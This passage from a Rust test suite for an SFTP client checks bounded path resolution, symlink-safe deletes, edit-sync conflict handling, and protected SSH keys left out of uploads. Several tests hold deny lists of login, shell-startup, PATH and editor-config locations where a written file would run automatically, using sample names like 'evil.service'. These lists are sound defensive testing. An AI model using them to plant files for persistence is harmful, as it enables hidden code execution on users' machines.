        let mut out = ExpandedDownload::default();
        let refused = materialize_download(
            Prepared::Folder(plan),
            &root,
            &download_ctx(false),
            &s,
            &mut out,
        );
        let spent = resolutions();

        assert_eq!(refused, None);
        assert_eq!(out.items.len(), 9_990);
        assert!(
            spent <= 10 * 8,
            "{spent} path resolutions for 10 folders and 9,990 files"
        );
    }

    /// Item 2, the upload side: every file of a picked folder went through
    /// the full read check (its own resolution plus every protected
    /// location's).
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_a_folder_upload_resolves_paths_per_folder_not_per_file() {
        let local = LocalDir::new();
        let base = canonical(&local);
        let pick = base.join("home").join("docs");
        for d in 0..4 {
            std::fs::create_dir_all(pick.join(format!("d{d}"))).unwrap();
        }
        for f in 0..2_000 {
            let dir = pick.join(format!("d{}", f % 4));
            std::fs::write(dir.join(format!("f{f}")), b"x").unwrap();
        }
        let s = sensitive_fixture(&base);
        let items = vec![serde_json::json!({
            "local": pick.display().to_string(),
            "remote": "/up/docs",
        })];

        reset_resolutions();
        let out = expand_upload_batch(&items, &batch(), &s).unwrap();
        let spent = resolutions();

        assert_eq!(out.jobs.len(), 2_000);
        assert!(
            spent <= 5 * 4 + 8,
            "{spent} path resolutions for 5 folders and 2,000 files"
        );
    }

    /// Item 2, job start: every queued download re-checks its final path
    /// when it starts (+9 ms per job on Windows). The protected locations are
    /// reused between checks now, so only the job's own path is resolved.
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_the_job_start_check_reuses_the_resolved_locations() {
        let local = LocalDir::new();
        let target = canonical(&local).join("downloads").join("f.txt");
        let _ = local_write_refusal(&target);

        reset_resolutions();
        let refused = local_write_refusal(&target);
        let spent = resolutions();

        assert_eq!(refused, None);
        assert!(
            spent <= 6,
            "{spent} path resolutions to re-check one queued download"
        );
    }

    /// Item 7: item errors shared the 25-entry warnings cap with the notes of
    /// the walks, so 30 skipped links hid the `/locked` error. Item errors
    /// come first now and are never dropped.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_item_errors_come_first_and_are_never_dropped_from_the_warnings() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/links/real.txt", b"x");
        for i in 0..30 {
            fx.symlink("real.txt", &format!("/links/l{i:02}"));
        }
        fx.write("/locked/x", b"x");
        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
        let local = LocalDir::new();
        let items = vec![
            serde_json::json!({ "remote": "/links" }),
            serde_json::json!({ "remote": "/locked" }),
        ];

        let out = expand_download_batch(
            &sftp,
            &items,
            &local.0.join("dl"),
            &batch(),
            SensitiveLocations::current(),
        )
        .await
        .unwrap();
        let warnings = out.warnings();

        assert!(
            warnings.first().is_some_and(|w| w.contains("/locked")),
            "{warnings:?}"
        );
        let links = warnings
            .iter()
            .filter(|w| w.contains("symbolic links are not followed"))
            .count();
        assert!(links > 0 && links <= Notes::KEEP, "{warnings:?}");
        assert!(
            warnings.iter().any(|w| w.contains("more")),
            "the hidden notes are counted: {warnings:?}"
        );
    }

    /// Item 2, the commands/mod.rs half: the system folders were resolved
    /// again for every check (on Windows up to seven folders, per file). They
    /// are resolved with the other protected locations now, so checking an
    /// existing folder resolves that folder and nothing else.
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_checking_a_path_resolves_only_that_path() {
        let local = LocalDir::new();
        let base = canonical(&local);
        let dir = base.join("home");
        std::fs::create_dir_all(&dir).unwrap();
        let s = sensitive_fixture(&base);

        reset_resolutions();
        let checked =
            validate_sftp_local_path_with(&dir.display().to_string(), LocalAccess::Write, &s);
        let spent = resolutions();

        assert!(checked.is_ok(), "{checked:?}");
        assert_eq!(spent, 1, "path resolutions to check one existing folder");
    }

    /// Item 15: the name sanitizer was not idempotent (`notes\u{3000}.` gave
    /// `notes\u{3000}`, which the plain-name check then refused because a
    /// second pass trims it to `notes`). Property: every output is a fixed
    /// point - over every name of up to four characters from the characters
    /// the sanitizer treats specially, and pseudo-random longer ones.
    #[test]
    fn ru6a_fix1_the_name_sanitizer_is_idempotent() {
        const ALPHABET: [char; 18] = [
            'a', 'C', 'O', 'N', '1', '$', '.', ' ', '\u{3000}', '\u{a0}', '\u{85}', '\u{2028}',
            '\t', '\u{1}', '\u{7f}', ':', '*', '"',
        ];
        let check = |name: &str| {
            if let Some(once) = sanitize_remote_name(name) {
                assert_eq!(
                    sanitize_remote_name(&once).as_deref(),
                    Some(once.as_str()),
                    "{name:?} -> {once:?}"
                );
            }
        };
        check("notes\u{3000}.");
        let mut names = vec![String::new()];
        for _ in 0..4 {
            names = names
                .iter()
                .flat_map(|n| ALPHABET.iter().map(move |c| format!("{n}{c}")))
                .collect();
            names.iter().for_each(|n| check(n));
        }
        // xorshift64, fixed seed: reproducible.
        let mut state: u64 = 0x9e37_79b9_7f4a_7c15;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        for _ in 0..20_000 {
            let len = 1 + (next() % 16) as usize;
            let name: String = (0..len)
                .map(|_| ALPHABET[(next() % ALPHABET.len() as u64) as usize])
                .collect();
            check(&name);
        }
    }

    /// Item 15, end to end: a remote name the sanitizer changes is accepted
    /// by the plain-name check in its sanitized form.
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_sanitized_names_pass_the_plain_name_check() {
        let local = LocalDir::new();
        let root = canonical(&local);
        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
        for remote in ["notes\u{3000}.", "a\u{85}.", "x\u{2028} ."] {
            let name = sanitize_remote_name(remote).expect("usable");
            assert_eq!(
                derived_local_refusal(&root, &root.join(&name), &s),
                None,
                "{remote:?} -> {name:?}"
            );
        }
    }

    /// Item 17: an upload pick that adds nothing - a link to a folder - and
    /// the protected files a folder upload leaves out were only logged. Both
    /// are the item's warnings now (and in the batch's warnings).
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_what_an_upload_leaves_out_is_reported_per_item() {
        let local = LocalDir::new();
        let base = canonical(&local);
        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
        std::fs::create_dir_all(base.join("real")).unwrap();
        std::fs::write(base.join("home/.ssh/id_ed25519"), b"secret").unwrap();
        std::fs::write(base.join("home/.ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA").unwrap();
        std::fs::write(base.join("home/notes.txt"), b"n").unwrap();
        std::fs::write(base.join("real/a.txt"), b"a").unwrap();
        std::os::unix::fs::symlink(base.join("real"), base.join("linked")).unwrap();
        let s = sensitive_fixture(&base);
        let path = |rel: &str| base.join(rel).display().to_string();
        let items = vec![
            serde_json::json!({ "local": path("home"), "remote": "/up/home" }),
            serde_json::json!({ "local": path("linked"), "remote": "/up/linked" }),
        ];

        let out = expand_upload_batch(&items, &batch(), &s).unwrap();

        let mut sources: Vec<&str> = out.jobs.iter().map(|j| j.local_path.as_str()).collect();
        sources.sort();
        assert_eq!(
            sources,
            vec![
                path("home/.ssh/id_ed25519.pub").as_str(),
                path("home/notes.txt").as_str()
            ]
        );
        let home = &out.outcomes[0];
        assert_eq!((home.status, home.added), (ItemStatus::Queued, 2));
        assert!(
            home.warnings
                .iter()
                .any(|w| w.contains(&path("home/.ssh/id_ed25519"))
                    && w.contains("cannot be uploaded")),
            "{:?}",
            home.warnings
        );
        // RU6a fix round 2 (nit): a pick that adds nothing at all is an
        // error, as for downloads.
        let linked = &out.outcomes[1];
        assert_eq!((linked.status, linked.added), (ItemStatus::Error, 0));
        let error = linked.error.clone().unwrap_or_default();
        assert!(
            error.contains(&path("linked")) && error.contains("link to a folder"),
            "{error}"
        );
        let all = out.warnings().join("\n");
        assert!(
            all.contains("link to a folder") && all.contains("id_ed25519"),
            "{all}"
        );
    }

    /// Item 19: more places where a written file runs at login or when a
    /// shell starts. Writing there is refused; reading (dotfile syncing) is
    /// still allowed, and the neighbours stay writable.
    #[test]
    fn ru6a_fix1_login_and_shell_startup_locations_are_refused_for_writes() {
        let Some(home) = dirs::home_dir() else { return };
        let at = |rel: &str| {
            rel.split('/')
                .fold(home.clone(), |p, part| p.join(part))
                .display()
                .to_string()
        };
        for rel in [
            ".config/autostart/evil.desktop",
            ".config/autostart-scripts/evil.sh",
            ".config/plasma-workspace/env/evil.sh",
            ".config/systemd/user/evil.service",
            ".config/systemd/user/default.target.wants/evil.service",
            ".local/share/systemd/user/evil.service",
            ".config/environment.d/50-evil.conf",
            "Library/LaunchAgents/evil.plist",
            ".bash_aliases",
            ".bash_logout",
            ".zlogout",
            ".inputrc",
            ".kshrc",
            ".cshrc",
            ".tcshrc",
            ".xprofile",
            ".xinitrc",
            ".xsession",
            ".xsessionrc",
            ".profile.d/evil.sh",
            ".config/fish/config.fish",
            ".config/fish/conf.d/evil.fish",
            ".config/powershell/Microsoft.PowerShell_profile.ps1",
            ".config/nushell/config.nu",
        ] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_err(),
                "{rel} must not be writable"
            );
        }
        for rel in [".config/fish/config.fish", ".bash_aliases", ".xinitrc"] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Read).is_ok(),
                "{rel} may be uploaded"
            );
        }
        for rel in [
            ".config/fishing/x",
            ".config/autostartup",
            ".profile.dx",
            ".config/systemd/other",
        ] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_ok(),
                "{rel} stays writable"
            );
        }
    }

    /// Item 19, the layout: the XDG folders the environment moves are
    /// covered as well as `~/.config` and `~/.local/share`, and the Windows
    /// PowerShell profiles sit in the real Documents folder and in
    /// `~/Documents`.
    #[test]
    fn ru6a_fix1_startup_locations_follow_the_xdg_folders_and_documents() {
        use std::path::Path;
        let home = Path::new("/h");
        let (startup, shell) = home_startup_locations(
            home,
            &[home.join(".config"), PathBuf::from("/x/cfg")],
            &[home.join(".local").join("share"), PathBuf::from("/x/data")],
        );
        for p in [
            "/h/.config/autostart",
            "/x/cfg/autostart",
            "/x/cfg/systemd/user",
            "/h/.local/share/systemd/user",
            "/x/data/systemd/user",
            "/h/Library/LaunchAgents",
        ] {
            assert!(startup.contains(&PathBuf::from(p)), "{p}: {startup:?}");
        }
        for p in [
            "/h/.bashrc",
            "/h/.zlogout",
            "/h/.profile.d",
            "/h/.config/fish",
            "/x/cfg/fish",
            "/x/cfg/powershell",
        ] {
            assert!(shell.contains(&PathBuf::from(p)), "{p}: {shell:?}");
        }
        assert_eq!(
            powershell_profile_dirs(Some(Path::new("/od/Documents")), Some(home)),
            vec![
                PathBuf::from("/od/Documents/PowerShell"),
                PathBuf::from("/od/Documents/WindowsPowerShell"),
                PathBuf::from("/h/Documents/PowerShell"),
                PathBuf::from("/h/Documents/WindowsPowerShell"),
            ]
        );
        assert_eq!(
            powershell_profile_dirs(Some(&home.join("Documents")), Some(home)).len(),
            2
        );
        let s = Locations {
            shell_startup: powershell_profile_dirs(Some(Path::new("/od/Documents")), None),
            ..Locations::default()
        }
        .resolve();
        let profile = Path::new("/od/Documents/PowerShell/Microsoft.PowerShell_profile.ps1");
        assert!(s.refusal(profile, LocalAccess::Write).is_some());
        assert!(s.refusal(profile, LocalAccess::Read).is_none());
        assert!(s
            .refusal(
                Path::new("/od/Documents/PowerShellScripts/x.ps1"),
                LocalAccess::Write
            )
            .is_none());
    }

    // ─── RU6a fix round 1, group C: servers without type bits (item 8) ───────

    /// `/t` holds `f`, `d/g`, `flink` (a link to `f`) and `link` (a link to
    /// `/keep`, whose `precious` must survive whatever is done to `/t`), on
    /// a server that leaves the type bits out and answers every READLINK with
    /// `readlink`.
    #[cfg(unix)]
    async fn untyped_tree_with_links(
        readlink: russh_sftp::protocol::StatusCode,
    ) -> (
        russh_sftp::client::SftpSession,
        crate::sftp::testkit::Fixture,
    ) {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/t/f", b"x");
        fx.write("/t/d/g", b"y");
        fx.write("/keep/precious", b"keep me");
        set_mode(&fx, "/keep/precious", 0o644);
        fx.symlink("f", "/t/flink");
        fx.symlink("../keep", "/t/link");
        {
            let mut knobs = fx.knobs.lock().unwrap();
            knobs.untyped_modes = true;
            knobs.readlink_status = Some(readlink);
        }
        (sftp, fx)
    }

    /// Item 8: with READLINK unsupported, deleting a folder left every plain
    /// file ("could not tell whether it is a file or a folder"). REMOVE is
    /// tried first now - it never follows a link - so files and links go,
    /// folders are emptied and removed, and nothing outside is touched.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_delete_without_readlink_removes_files_links_and_folders() {
        use russh_sftp::protocol::StatusCode;
        let (sftp, fx) = untyped_tree_with_links(StatusCode::OpUnsupported).await;

        let deleted = remove_remote_tree(&sftp, "/t").await;

        assert_eq!(deleted, Ok(()));
        assert!(!fx.exists("/t"));
        assert_eq!(fx.read("/keep/precious"), b"keep me");
    }

    /// Item 8 (sec F2): a server whose READLINK answers "failure" for a link
    /// too. The link was taken for "not a link", opened as a folder - which
    /// follows it - and everything it pointed to was deleted. Even when the
    /// link itself cannot be removed, it is not followed now: it opens as a
    /// folder but does not resolve to itself.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_delete_never_empties_the_folder_a_link_points_to() {
        use russh_sftp::protocol::StatusCode;
        let (sftp, fx) = untyped_tree_with_links(StatusCode::Failure).await;
        assert_eq!(remove_remote_tree(&sftp, "/t").await, Ok(()));
        assert!(!fx.exists("/t"));
        assert_eq!(fx.read("/keep/precious"), b"keep me");

        let (sftp, fx) = untyped_tree_with_links(StatusCode::Failure).await;
        fx.knobs
            .lock()
            .unwrap()
            .remove_refused
            .push("/t/link".to_string());
        let err = remove_remote_tree(&sftp, "/t").await.unwrap_err();
        assert!(err.contains("/t/link"), "{err}");
        assert!(fx.exists("/keep/precious"), "{err}");
        assert_eq!(fx.read("/keep/precious"), b"keep me");
    }

    /// Item 8, the folder the user picked: a link to a folder handed to a
    /// recursive delete is unlinked - the folder it points to is never
    /// emptied - whether or not the server reports types.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_recursive_delete_of_a_link_only_unlinks_it() {
        for untyped in [false, true] {
            let (sftp, fx) = crate::sftp::testkit::serve().await;
            fx.write("/keep/precious", b"keep me");
            fx.symlink("keep", "/link");
            fx.knobs.lock().unwrap().untyped_modes = untyped;

            let deleted = remove_remote_tree(&sftp, "/link").await;

            assert_eq!(deleted, Ok(()), "untyped={untyped}");
            assert!(
                std::fs::symlink_metadata(fx.path("/link")).is_err(),
                "untyped={untyped}"
            );
            assert_eq!(fx.read("/keep/precious"), b"keep me", "untyped={untyped}");
        }
    }

    /// Item 8, the same guard for the walks (download, chmod): with READLINK
    /// answering "failure" a link was walked as a folder - a folder download
    /// fetched what it points to - and with READLINK unsupported nothing at
    /// all could be told apart. An entry counts as a folder or a file only
    /// when it resolves to itself; one that resolves elsewhere is a link.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_walks_tell_links_apart_when_readlink_cannot() {
        use russh_sftp::protocol::StatusCode;
        for readlink in [StatusCode::Failure, StatusCode::OpUnsupported] {
            let (sftp, fx) = untyped_tree_with_links(readlink).await;
            let mut got: Vec<(String, EntryKind)> = list_remote_dir(&sftp, "/t")
                .await
                .unwrap()
                .into_iter()
                .map(|e| (e.name, e.kind))
                .collect();
            got.sort_by(|a, b| a.0.cmp(&b.0));
            assert_eq!(
                got,
                vec![
                    ("d".to_string(), EntryKind::Dir),
                    ("f".to_string(), EntryKind::File),
                    ("flink".to_string(), EntryKind::Symlink),
                    ("link".to_string(), EntryKind::Symlink),
                ],
                "{readlink:?}"
            );
            let sftp_ref: &russh_sftp::client::SftpSession = &sftp;
            let plan = plan_download("/t", "t", |dir| async move {
                list_remote_dir(sftp_ref, &dir).await
            })
            .await
            .unwrap();
            let mut files: Vec<&str> = plan.files.iter().map(|f| f.remote.as_str()).collect();
            files.sort();
            assert_eq!(files, vec!["/t/d/g", "/t/f"], "{readlink:?}");
            let out = chmod_path(&sftp, "/t", 0o600, true, true, false)
                .await
                .unwrap();
            assert_eq!(fx.mode("/keep/precious"), 0o644, "{readlink:?}: {out}");
            assert_eq!(out["skippedLinks"], 2, "{readlink:?}: {out}");
        }
    }

    // ─── RU6a fix round 2 ────────────────────────────────────────────────────

    /// Item 1: a save whose swap the server refuses (a sticky shared folder,
    /// a Windows file held open, an immutable file) was tried again by every
    /// periodic check - another `ok:false` event and another full copy left
    /// as a temporary file each time - for as long as the edit stayed open.
    /// The failure is reported once and a check finds nothing new to try; the
    /// next real save tries again, after removing the temporary file the
    /// failed swap left.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix2_a_failing_save_is_not_retried_by_the_periodic_check() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        fx.knobs
            .lock()
            .unwrap()
            .remove_refused
            .push("/srv/app.conf".to_string());
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        let seen = || events.lock().unwrap().clone();

        std::fs::write(&staged, b"my edit").unwrap();
        sync.clone().react(WatchVerdict::Save).await;
        for _ in 0..3 {
            sync.clone().react(WatchVerdict::Rescan).await;
        }
        assert_eq!(seen().len(), 1, "{:?}", seen());
        assert_eq!(seen()[0]["ok"], false, "{:?}", seen());
        assert_eq!(
            temps_in(&fx, "/srv").len(),
            1,
            "{:?}",
            temps_in(&fx, "/srv")
        );

        // A real save tries again - and leaves at most one temporary file.
        sync.clone().react(WatchVerdict::Save).await;
        assert_eq!(seen().len(), 2, "{:?}", seen());
        assert_eq!(
            temps_in(&fx, "/srv").len(),
            1,
            "{:?}",
            temps_in(&fx, "/srv")
        );

        // Once the server allows it, the next save goes in; nothing is left.
        fx.knobs.lock().unwrap().remove_refused.clear();
        sync.clone().react(WatchVerdict::Save).await;
        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
        assert!(
            temps_in(&fx, "/srv").is_empty(),
            "{:?}",
            temps_in(&fx, "/srv")
        );
        assert_eq!(seen().last().unwrap()["ok"], true, "{:?}", seen());
    }

    /// Item 1: with the staged copy gone, every check reported the same read
    /// error again (five events in 1.3 s at a short period). Once is enough.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix2_an_unreadable_staged_copy_is_reported_once() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        std::fs::remove_file(&staged).unwrap();

        for _ in 0..3 {
            sync.clone().react(WatchVerdict::Rescan).await;
        }

        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1, "{events:?}");
        let error = events[0]["error"].as_str().unwrap_or_default();
        assert!(error.contains("could not read the saved file"), "{error}");
    }

    /// Item 2: on a server that reports neither size nor time, the re-check
    /// before an Overwrite compared size and time only - always empty - so it
    /// overwrote a second remote change (Bob's v3). The conflict was found by
    /// content, so it is checked by content again.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix2_overwrite_rechecks_by_content_when_the_server_has_no_stamps() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        fx.knobs.lock().unwrap().strip_size_mtime = true;
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        fx.write("/srv/app.conf", b"v2 - Bob");
        std::fs::write(&staged, b"my edit").unwrap();
        sync.clone().on_change().await;
        let first = conflict_id(&events);

        fx.write("/srv/app.conf", b"v3 - Bob saved again");
        let result = sync
            .clone()
            .resolve(&first, EditResolution::Overwrite)
            .await
            .expect("a fresh conflict, not an error");

        assert_eq!(fx.read("/srv/app.conf"), b"v3 - Bob saved again");
        assert_eq!(result["conflict"], true, "{result}");
        let fresh = result["conflictId"].as_str().unwrap().to_string();
        assert_ne!(fresh, first);
        // An Overwrite of the conflict as reported goes ahead.
        sync.clone()
            .resolve(&fresh, EditResolution::Overwrite)
            .await
            .expect("overwrite");
        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
    }

    /// Item 3: on a server that leaves the type bits out and answers "list
    /// this folder" on a file with "permission denied", the temporary file
    /// could not be proven to be a file, so every save failed (before round 1
    /// they worked). A temp that is not a link and holds exactly the bytes
    /// just written is accepted - with READLINK working or not.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix2_edit_saves_work_when_the_folder_probe_on_a_file_is_refused() {
        use russh_sftp::protocol::StatusCode;
        for readlink in [None, Some(StatusCode::OpUnsupported)] {
            let (sftp, fx) = crate::sftp::testkit::serve().await;
            fx.write("/srv/app.conf", b"v1");
            {
                let mut knobs = fx.knobs.lock().unwrap();
                knobs.untyped_modes = true;
                knobs.opendir_file_status = Some(StatusCode::PermissionDenied);
                knobs.readlink_status = readlink;
            }
            let local = LocalDir::new();
            let staged = local.0.join("staged.conf");
            std::fs::write(&staged, b"my edit").unwrap();

            let up = upload_edited_file(&sftp, &staged, "/srv/app.conf", None).await;

            assert!(up.is_ok(), "{readlink:?}: {up:?}");
            assert_eq!(fx.read("/srv/app.conf"), b"my edit", "{readlink:?}");
            assert!(temps_in(&fx, "/srv").is_empty(), "{readlink:?}");
        }
    }

    /// Item 4: two `sftp_open_for_edit` calls for the same file at the same
    /// time both downloaded it, then the second ended the first - whose
    /// caller had already handed its copy to an editor (deleted, its saves
    /// never synced, no event). One session survives and both callers get it.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix2_two_concurrent_opens_of_one_file_share_one_session() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", &vec![b'x'; 200_000]);
        let registry = EditRegistry::new();
        let temp = LocalDir::new();
        let sftp = Arc::new(sftp);
        let emit: Arc<dyn Fn(serde_json::Value) + Send + Sync> = Arc::new(|_| {});
        let open = || {
            open_for_edit_in(
                &registry,
                sftp.clone(),
                "sess".to_string(),
                "/srv/app.conf".to_string(),
                temp.0.clone(),
                emit.clone(),
            )
        };

        let (a, b) = tokio::join!(open(), open());
        let (a, b) = (a.expect("first open"), b.expect("second open"));

        assert_eq!(a["editId"], b["editId"], "{a} {b}");
        assert_eq!(a["localPath"], b["localPath"], "{a} {b}");
        let live = registry
            .live_for_key("sess:/srv/app.conf")
            .expect("one live session");
        assert!(!live.is_stopped());
        assert_eq!(a["editId"], live.edit_id());
        let local = a["localPath"].as_str().unwrap();
        assert!(std::path::Path::new(local).exists());
        let staged: Vec<PathBuf> = std::fs::read_dir(&temp.0)
            .unwrap()
            .flatten()
            .map(|e| e.path())
            .collect();
        assert_eq!(staged.len(), 1, "the second copy is deleted: {staged:?}");
        registry.stop_all();
    }

    /// Item 6 (sec N2): places where a written file runs when a program is
    /// next used: user folders on the PATH, git's settings, the PAM
    /// environment and the editors' startup files (SSHSpan's edit flow starts
    /// the system editor). Writing there is refused; reading stays allowed.
    #[test]
    fn ru6a_fix2_program_and_path_locations_are_refused_for_writes() {
        let Some(home) = dirs::home_dir() else { return };
        let at = |rel: &str| {
            rel.split('/')
                .fold(home.clone(), |p, part| p.join(part))
                .display()
                .to_string()
        };
        for rel in [
            ".local/bin/ls",
            "bin/ls",
            ".gitconfig",
            ".config/git/config",
            ".pam_environment",
            ".vimrc",
            ".vim/plugin/evil.vim",
            ".config/nvim/init.lua",
            ".emacs",
            ".emacs.d/init.el",
            ".config/emacs/init.el",
        ] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_err(),
                "{rel} must not be writable"
            );
        }
        for rel in [
            ".gitconfig",
            ".vimrc",
            ".emacs.d/init.el",
            ".local/bin/tool",
        ] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Read).is_ok(),
                "{rel} may be uploaded"
            );
        }
        for rel in [".gitconfig.bak", ".local/binaries/x", "notes.txt"] {
            assert!(
                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_ok(),
                "{rel} stays writable"
            );
        }
    }

    /// Item 6, the layout: every PATH folder inside the home folder counts
    /// (not the home folder itself, nor folders elsewhere), and on Windows
    /// the WindowsApps folder, Office's startup folders and template, and
    /// Windows Terminal's settings in each of its package folders. (Unix
    /// spellings: `/h` is not an absolute path on Windows.)
    #[cfg(unix)]
    #[test]
    fn ru6a_fix2_program_locations_follow_the_path_office_and_terminal() {
        use std::path::Path;
        let home = Path::new("/h");
        let found = home_program_locations(
            home,
            &[home.join(".config"), PathBuf::from("/x/cfg")],
            &[
                home.join(".cargo").join("bin"),
                home.to_path_buf(),
                PathBuf::from("/usr/bin"),
                PathBuf::from("relative/bin"),
            ],
        );
        for p in [
            "/h/.local/bin",
            "/h/bin",
            "/h/.cargo/bin",
            "/h/.gitconfig",
            "/h/.vim",
            "/h/.emacs.d",
            "/h/.config/git",
            "/x/cfg/nvim",
        ] {
            assert!(found.contains(&PathBuf::from(p)), "{p}: {found:?}");
        }
        for p in ["/h", "/usr/bin", "relative/bin"] {
            assert!(!found.contains(&PathBuf::from(p)), "{p}: {found:?}");
        }

        let windows = windows_program_locations(
            Some(Path::new("/r/Roaming")),
            Some(Path::new("/r/Local")),
            &[PathBuf::from(
                "/r/Local/Packages/Microsoft.WindowsTerminal_8wekyb3d8bbwe",
            )],
        );
        for p in [
            "/r/Roaming/Microsoft/Word/STARTUP",
            "/r/Roaming/Microsoft/Excel/XLSTART",
            "/r/Roaming/Microsoft/Templates/Normal.dotm",
            "/r/Local/Microsoft/WindowsApps",
            "/r/Local/Microsoft/Windows Terminal/settings.json",
            "/r/Local/Packages/Microsoft.WindowsTerminal_8wekyb3d8bbwe/LocalState/settings.json",
        ] {
            assert!(windows.contains(&PathBuf::from(p)), "{p}: {windows:?}");
        }
        assert!(windows_program_locations(None, None, &[]).is_empty());
    }

    /// Item 6: Windows Terminal's package folders are found by name (stable,
    /// preview, canary), and nothing else in the folder is taken for one.
    #[cfg(unix)]
    #[test]
    fn ru6a_fix2_windows_terminal_packages_are_found_by_name() {
        let local = LocalDir::new();
        for name in [
            "Microsoft.WindowsTerminal_8wekyb3d8bbwe",
            "Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe",
            "Microsoft.WindowsCalculator_8wekyb3d8bbwe",
        ] {
            std::fs::create_dir_all(local.0.join(name)).unwrap();
        }
        let mut found: Vec<String> = windows_terminal_packages(&local.0)
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        found.sort();
        assert_eq!(
            found,
            vec![
                "Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe",
                "Microsoft.WindowsTerminal_8wekyb3d8bbwe",
            ]
        );
        assert!(windows_terminal_packages(&local.0.join("missing")).is_empty());
    }
}
